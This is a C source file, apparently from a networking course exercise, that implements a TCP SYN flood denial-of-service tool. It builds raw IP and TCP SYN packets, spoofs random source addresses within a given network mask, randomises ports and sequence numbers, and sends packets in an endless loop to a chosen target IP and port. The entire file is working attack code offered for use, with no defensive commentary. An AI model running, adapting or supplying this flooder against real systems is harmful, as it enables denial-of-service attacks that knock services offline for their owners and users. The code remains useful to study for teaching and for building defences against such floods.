/*
 * tcp_flooder.c
 *
 *  Created on: May 4, 2016
 *      Author: jiaziyi
 *  Modded. by: João Andreotti
 */


#include <assert.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "header.h"

#define MAX_TCP_PORT 65536

void recalc_checksum(struct pseudo_tcp_header *pshdr, struct tcphdr *tcph, struct iphdr *iph);

int main(int argc, char *argv[])
{
	// Parses commandline
	if (argc != 5) {
		printf("Usage: %s (source_ip) (network_mask) (dest_ip) (dest_port)\n", argv[0]);
		exit(-1);
	}
	
	char *source_ip = argv[1];
	char *dest_ip = argv[3];

	u_int16_t dst_port = atoi(argv[4]);


	// Opens socket
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

	char packet[65536];
	memset(packet, 0, 65536);

	// Some of the following code takes inspiration from:
	// https://www.binarytides.com/raw-sockets-c-code-linux/
	// IP header pointer
	struct iphdr *iph = (struct iphdr *) packet;

	// TCP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

	//fill the IP header here
	assert(sizeof(struct iphdr) == 20);
	iph->version = 4; // IPv4
	iph->ihl = 5;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = 0;
	iph->frag_off = 0;
	iph->ttl = 0xFF;
	iph->protocol = 6;

	// parses and sets addresses
	iph->saddr = inet_addr(source_ip);
	iph->daddr = inet_addr(dest_ip);

	// calculates IPv4 checksum
	iph->check = 0;
	iph->check = checksum((unsigned short *) iph, sizeof(struct iphdr));

	//fill the TCP header for an initial SYN Packet
	tcph->source = 0;
	tcph->dest = htons(dst_port);
	tcph->seq = 0; // TODO: Revise, seems to be arbitrary though
	tcph->ack_seq = 0; 
	tcph->res1 = 0;
	tcph->doff = (unsigned char) (sizeof(struct tcphdr) / 4);
	
	// Flags
	tcph->fin = 0;
	tcph->syn = 1; // Sets the packet as a SYN packet
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->res2 = 0;

	tcph->window = htons(512);
	tcph->urg_ptr = 0;

	// calculates TCP checksum
	struct pseudo_tcp_header pshdr = {
		.source_address = iph->saddr,
		.dest_address = iph->daddr,
		.placeholder = 0x00,
		.protocol = iph->protocol,
		.tcp_length = sizeof(struct tcphdr),
	};

	recalc_checksum(&pshdr, tcph, iph);

	// Network mask for spoofing
	u_int32_t mask = inet_addr(argv[2]);

	//send the packet
	struct sockaddr_in daddr;
    memset(&daddr, 0, sizeof(daddr));

    daddr.sin_family = AF_INET;

    if (inet_pton(AF_INET, dest_ip, &daddr.sin_addr) != 1) {
        printf("Failed to parse destination address.\n");
        exit(-1);
    }

	printf("Flooding...\n");
	srand(time(NULL));
	for (;;) {
		// Changes port, window and seq num 
		tcph->source = htons(rand() % MAX_TCP_PORT);
		tcph->seq = rand();
		tcph->window = htons(256 + rand() % 512);

		// Changes source IP
		iph->saddr &= mask;
		iph->saddr += rand() & ~mask;
		
		pshdr.source_address = iph->saddr;

		// Updates Checksum
		recalc_checksum(&pshdr, tcph, iph);

		// Sends
		if (sendto(fd, packet, iph->tot_len, 0, (struct sockaddr *) &daddr, sizeof(daddr)) == -1)
			continue;
	}

	return 0;
}

void recalc_checksum(struct pseudo_tcp_header *pshdr, struct tcphdr *tcph, struct iphdr *iph) {
	// IP header checksum
	iph->check = checksum((unsigned short *) iph, sizeof(struct iphdr));

	// TCP checksum
	tcph->check = 0;
	u_int16_t check_ps = checksum((unsigned short *) pshdr, sizeof(struct pseudo_tcp_header));
	unsigned long sum = 
		~check_ps + 1 +
		~checksum((unsigned short *) tcph, sizeof(struct tcphdr)) + 1;
	

	sum += 5100;
	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);

	tcph->check = (short) ~sum;
}